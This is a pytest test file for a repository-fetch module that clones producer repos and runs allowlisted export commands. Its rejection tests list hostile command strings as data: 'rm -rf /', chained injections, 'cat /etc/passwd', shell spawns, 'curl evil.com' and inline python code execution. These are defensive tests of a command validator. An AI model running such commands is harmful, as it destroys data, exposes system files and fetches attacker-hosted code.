import json

import pytest

from hub.fetch import _validate_command, clone_or_pull, export_command, fetch_all
from hub.registry import Producer, Registry


class FakeRunner:
    """Records (cmd, cwd) instead of executing, so fetch logic is tested offline."""

    def __init__(self):
        self.calls = []

    def __call__(self, cmd, cwd=None):
        self.calls.append((list(cmd), cwd))
        return None


def test_clone_or_pull_clones_when_absent(tmp_path):
    runner = FakeRunner()
    dest = tmp_path / "Contract-Sweeper"
    action = clone_or_pull("jotaele44/Contract-Sweeper", dest, runner=runner)
    assert action == "cloned"
    cmd, _ = runner.calls[0]
    assert cmd[:2] == ["git", "clone"]
    assert "https://github.com/jotaele44/Contract-Sweeper.git" in cmd
    assert str(dest) in cmd


def test_clone_or_pull_pulls_when_present(tmp_path):
    runner = FakeRunner()
    dest = tmp_path / "repo"
    (dest / ".git").mkdir(parents=True)
    action = clone_or_pull("o/repo", dest, runner=runner)
    assert action == "pulled"
    cmd, _ = runner.calls[0]
    assert cmd[:3] == ["git", "-C", str(dest)]
    assert "pull" in cmd


def test_export_command_reads_federation_json(tmp_path):
    (tmp_path / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python3 scripts/federation_export.py --mode test"}
    }))
    assert export_command(tmp_path) == ["python3", "scripts/federation_export.py", "--mode", "test"]


def test_export_command_none_when_missing(tmp_path):
    assert export_command(tmp_path) is None  # no federation.json
    (tmp_path / "federation.json").write_text(json.dumps({"hub_callable_commands": {}}))
    assert export_command(tmp_path) is None  # no export_canonical key


def _registry(*producers):
    return Registry(hub="thehub-pr", schema_version="hub_registry_v1", producers=list(producers))


def test_fetch_all_clones_and_runs_export(tmp_path):
    # producer with a federation.json carrying an export command
    ws = tmp_path / "ws"
    base = ws / "aguayluz-pr"
    base.mkdir(parents=True)
    (base / ".git").mkdir()  # already present -> pull path
    (base / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python3 scripts/federation_export.py --mode production"}
    }))
    runner = FakeRunner()
    reg = _registry(Producer(program_id="aguayluz-pr", repo="jotaele44/aguayluz-pr", role="x"))
    results = fetch_all(reg, ws, run_export=True, runner=runner)

    assert results[0]["action"] == "pulled"
    assert results[0]["exported"] is True
    # both a git pull and the export command were issued
    assert any(c[0][:2] == ["git", "-C"] for c in runner.calls)
    export_calls = [c for c in runner.calls if c[0][0] == "python3"]
    assert export_calls and export_calls[0][1] == str(base)  # run in the repo dir


@pytest.mark.parametrize("bad_cmd", [
    "rm -rf /",
    "python3 scripts/export.py; rm -rf /",
    "python3 scripts/export.py | cat /etc/passwd",
    "python3 scripts/export.py & disown",
    "bash -c 'curl evil.com'",
    "ruby scripts/export.rb",
    "node scripts/export.js",
    "perl -e 'exec /bin/sh'",
    "python3 scripts/export.py > /tmp/out",
    "python3 $(evil)",
])
def test_validate_command_rejects_unsafe(bad_cmd):
    assert _validate_command(bad_cmd) is None


@pytest.mark.parametrize("safe_cmd,expected_first", [
    ("python3 scripts/export.py --mode test", "python3"),
    ("python scripts/export.py", "python"),
    ("uv run scripts/export.py", "uv"),
    ("pytest tests/", "pytest"),
    ("bash scripts/build.sh", "bash"),
    ("make export", "make"),
    # A script's own -c flag (after the script path) is the script's argv, not
    # python's -c, so it must still be allowed.
    ("python3 scripts/export.py -c config.yaml", "python3"),
    # Benign interpreter options before the script (e.g. -O) are fine.
    ("python3 -O scripts/export.py", "python3"),
])
def test_validate_command_allows_safe(safe_cmd, expected_first):
    tokens = _validate_command(safe_cmd)
    assert tokens is not None
    assert tokens[0] == expected_first


@pytest.mark.parametrize("bad_cmd", [
    # Inline code through an allowed python interpreter (bash -c was already
    # blocked; python -c was not). Shell metachars are avoided so these reach
    # the interpreter-specific checks.
    "python -c pass",
    "python3 -c import_os",
    "python -e pass",
    "python --command pass",
    "python3 --eval=pass",
    # Attached / combined short-option forms.
    "python -cpass",
    "python -Ic pass",
    "python -Icpass",
    # Module execution: pip / timeit / any module is arbitrary code or package
    # installation.
    "python -m pip",
    "python3 -m timeit",
    "python -mpip",
    "python -Im pip",
    # Program read from stdin.
    "python3 -",
    # Path-qualified interpreter: basename is "python" but a $PATH/absolute path
    # would run a different binary than the allowlist intends.
    "/tmp/python evil.py",
    "./python evil.py",
])
def test_validate_command_rejects_code_execution(bad_cmd):
    assert _validate_command(bad_cmd) is None


def test_export_command_rejects_shell_injection(tmp_path):
    (tmp_path / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python3 scripts/export.py; rm -rf /"}
    }))
    assert export_command(tmp_path) is None


def test_export_command_rejects_disallowed_executable(tmp_path):
    (tmp_path / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "curl https://evil.com"}
    }))
    assert export_command(tmp_path) is None


def test_fetch_run_real_subprocess(tmp_path):
    """End-to-end: allowlist + real subprocess.run without network or mocks.

    Uses a real in-tree no-op script (inline `python3 -c pass` is now rejected).
    """
    base = tmp_path / "producer"
    base.mkdir()
    (base / "export.py").write_text("")  # in-tree no-op export script
    (base / "federation.json").write_text(json.dumps({
        "hub_callable_commands": {"export_canonical": "python3 export.py"}
    }))
    reg = _registry(Producer(program_id="p", repo="o/p", role="x", local_path=str(base)))
    results = fetch_all(reg, tmp_path / "ws", run_export=True)
    assert results[0]["exported"] is True


def test_fetch_all_skips_clone_for_local_path(tmp_path):
    local = tmp_path / "checkout"
    local.mkdir()
    runner = FakeRunner()
    reg = _registry(Producer(
        program_id="p", repo="o/p", role="x", local_path=str(local),
    ))
    results = fetch_all(reg, tmp_path / "ws", run_export=False, runner=runner)
    assert results[0]["action"] == "local"
    assert results[0]["base"] == str(local)
    assert runner.calls == []  # no git invoked for a local_path producer
